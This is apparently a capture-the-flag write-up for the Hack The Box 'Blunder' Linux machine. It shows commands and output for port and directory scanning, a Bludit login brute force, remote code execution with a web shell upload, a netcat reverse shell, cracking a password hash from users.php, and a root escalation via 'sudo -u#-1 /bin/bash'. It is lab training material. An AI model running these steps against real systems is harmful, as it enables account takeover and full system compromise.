## Default Information
IP Address: 10.10.10.191\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.191    blunder.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.191 --rate=1000 -e tun0
[sudo] password for kali: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-06 15:56:58 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.191  
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80	| http | Apache httpd 2.4.41 ((Ubuntu)) | Open |


### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://blunder.htb

```
http://10.10.10.191:80/.htaccess.txt        (Status: 403) [Size: 277]
http://10.10.10.191:80/.htpasswd.txt        (Status: 403) [Size: 277]
http://10.10.10.191:80/.htaccess.html       (Status: 403) [Size: 277]
http://10.10.10.191:80/.htpasswd.html       (Status: 403) [Size: 277]
http://10.10.10.191:80/.htaccess            (Status: 403) [Size: 277]
http://10.10.10.191:80/.htpasswd            (Status: 403) [Size: 277]
http://10.10.10.191:80/.htaccess.php        (Status: 403) [Size: 277]
http://10.10.10.191:80/.htpasswd.php        (Status: 403) [Size: 277]
http://10.10.10.191:80/.htaccess.asp        (Status: 403) [Size: 277]
http://10.10.10.191:80/.htpasswd.asp        (Status: 403) [Size: 277]
http://10.10.10.191:80/.htaccess.aspx       (Status: 403) [Size: 277]
http://10.10.10.191:80/.htpasswd.aspx       (Status: 403) [Size: 277]
http://10.10.10.191:80/0                    (Status: 200) [Size: 7562]
http://10.10.10.191:80/.htaccess.jsp        (Status: 403) [Size: 277]
http://10.10.10.191:80/.htpasswd.jsp        (Status: 403) [Size: 277]
http://10.10.10.191:80/LICENSE              (Status: 200) [Size: 1083]
http://10.10.10.191:80/about                (Status: 200) [Size: 3281]
http://10.10.10.191:80/admin                (Status: 301) [Size: 0] [--> http://10.10.10.191/admin/]
http://10.10.10.191:80/cgi-bin/             (Status: 301) [Size: 0] [--> http://10.10.10.191/cgi-bin]
http://10.10.10.191:80/install.php          (Status: 200) [Size: 30]
http://10.10.10.191:80/robots.txt           (Status: 200) [Size: 22]
http://10.10.10.191:80/robots.txt           (Status: 200) [Size: 22]
http://10.10.10.191:80/server-status        (Status: 403) [Size: 277]
http://10.10.10.191:80/todo.txt             (Status: 200) [Size: 118]
http://10.10.10.191:80/usb                  (Status: 200) [Size: 3960]
```

### Web-content discovery

From Gobuster, we discover an interesting endpoint /cgi-bin, but we realize that this site redirects us to an empty page that says PAGE NOT FOUND. 

Another interesting discovery from Gobuster is the /robots.txt endpoint, but there is not much discovery on this endpoint. However, visiting http://blunder.htb/todo.txt shows
us some interesting users, and we can guess that fergus is one of the user of the website.

```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

Visiting http://blunder.htb/admin, we are greeted with a login interface which also tells us that this is a Bludit CMS. Viewing the source code, we are also able to find out 
that the Bludit version that we are looking at 3.9.2

![Bludit version](https://github.com/joelczk/writeups/blob/main/HTB/Images/Blundit/bludit_version.png)

Searching the potential vulnerabilities of Bludit, we are able to discover an authentication bruteforce bypass, which means that we can try to bruteforce the password using fergus 
as the username for the login page
```
┌──(kali㉿kali)-[~]
└─$ searchsploit bludit 3.9.2
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypas | php/webapps/48746.rb
Bludit 3.9.2 - Auth Bruteforce Bypass                      | php/webapps/48942.py
Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploi | php/webapps/49037.rb
Bludit 3.9.2 - Directory Traversal                         | multiple/webapps/48701.txt
----------------------------------------------------------- ---------------------------------
```

## Exploit

### Bruteforcing credentials
Let's try to bruteforce the credentials using (CVE-2019-17240)[https://nvd.nist.gov/vuln/detail/CVE-2019-17240]. Let's start by creating a custom wordlist using cewl

```
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ cewl http://blunder.htb > wordlist
```

Next, we will write a script to check for the correct password using the wordlist that we have generated previously, and fergus as the username. From the output we can obtain the password as RolandDeschain

```
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ python3 exploit.py -l http://blunder.htb -u "fergus" -p /home/kali/Desktop/wordlist
[+] Exploiting Auth Bypass on Bludit 3.9.2 (CVE-2019-17240)
[+] Starting exploit...
[+] Valid credentials found!
[+] Login to http://blunder.htb/admin/login with fergus:RolandDeschain
```

### Obtaining reverse shell
Logging into the bludit site with fergus:RolandDeschain, we realize that Bludit 3.9.2 is also vulnerable to (CVE-2019-16113)[https://github.com/bludit/bludit/issues/1081], which is a code execution vulnerability. Using that we execute the command to spawn a reverse shell.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 rce.py                                                                     
[+] Login successful.
[+] Token CSRF: 5c63b5c14ff5e581978aa4c3e30d23cf41a6e5a6
[+] Shell upload succesful.
[+] .htaccess upload succesful.
[+] Command Execution Successful.
```
Next, we will stabilize the reverse shell

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000 
listening on [any] 3000 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.191] 49282
bash: cannot set terminal process group (1225): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ python -c 'import pty; pty.spawn("/bin/bash")'
<tmp$ python -c 'import pty; pty.spawn("/bin/bash")'   
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ export TERM=xterm
export TERM=xterm
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ stty cols 132 rows 34
stty cols 132 rows 34
```

Navigating to the /home directory, we realize that there are only 2 users -- Hugo and Shawn

```
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cd /home
cd /home
www-data@blunder:/home$ ls
ls
hugo  shaun
```

Afterwards, we also find out that the user flag is in Hugo's directory, but we do not have the required privileges to view the user flag.

```
www-data@blunder:/home$ cat hugo/user.txt
cat hugo/user.txt
cat: hugo/user.txt: Permission denied
www-data@blunder:/home$ cat shaun/user.txt
cat shaun/user.txt
cat: shaun/user.txt: No such file or directory
```

### Privilege Escalation to Hugo
Recalling that there is a /admin/users endpoint on the admin interface (but we are unable to access the endpoint due to insufficient permission) , let us look for the users 
page in the reverse shell. Unforunately, we are able to find the users.php file but the we are unable to decrypt the SHA1 hash for the admin user

```
www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cat users.php
cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
}www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$
```

However in the /var/www directory, there is another extra folder ```bludit-3.10.0a```. Let us navigate to this folder to see if we get any findings. Navigating to this folder, we realize that the directory structure is similiar to that of ```bludit-3.9.2```, so let's view the users.php file

```
www-data@blunder:/var/www/bludit-3.10.0a$ cat bl-content/databases/users.php
cat bl-content/databases/users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

We realize that the users.php file contains the hashed password belonging to Hugo, which is one of the users that we have found earlier. Decrypting this SHA1 hash gives us the password Password120 for Hugo. Let's now ```su``` to hugo with the password.

```
www-data@blunder:/home$ su hugo
su hugo
Password: Password120

hugo@blunder:/home$ 
```

### Obtaining user flag
```
hugo@blunder:/home$ cat hugo/user.txt
cat hugo/user.txt
<Redacted user flag>
```
### Privilege Escalation to root

Running ```sudo -l```, we realize that all the users are able to execute /bin/bash command except for root.

```
hugo@blunder:/home$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

Using LinEnum.sh, we realize that this terminal is running on a vulnerable version of sudo that allows for privilege escalation (CVE-2019-14287).

```
### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.25p1
```

Using the exploit, the vulnearble versions of Sudo doesn’t validate if the user ID specified using the -u flag actually exists and it executes the command using an arbitrary user id with root privileges, and since -u#-1 returns 0, which is the user id of the root user, /bin/bash will be executed as root

```
hugo@blunder:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
Password: Password120

root@blunder:/home/hugo# id
id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
```

### Obtaining root flag

```
root@blunder:/home/hugo# cat /root/root.txt
cat /root/root.txt
<Redacted root flag>
root@blunder:/home/hugo# 
```

## Post-Exploitation
### Directory-Traversal
### CVE-2019-16113
### CVE-2019-14287
CVE-2019-14287 is a privilege escalation vulnerability affecting sudo versions prior to 1.8.28. In this case, the sudo version is 1.8.25p1 which is defintely earlier than 1.8.28
and so it is vulnerable to this CVE.

When running as ```sudo```, we can execute ```sudo -u [user]``` to specify the user that we want to run as. In this vulnerability, ```sudo``` does not validate if the user ID specified using the -u flag actually exists and executes the command using an arbitrary user id with root privileges. If the arbitrary user id does not exist, the user id will default to 0, which is the root user and therefore allowing commands to be executed with root privileges
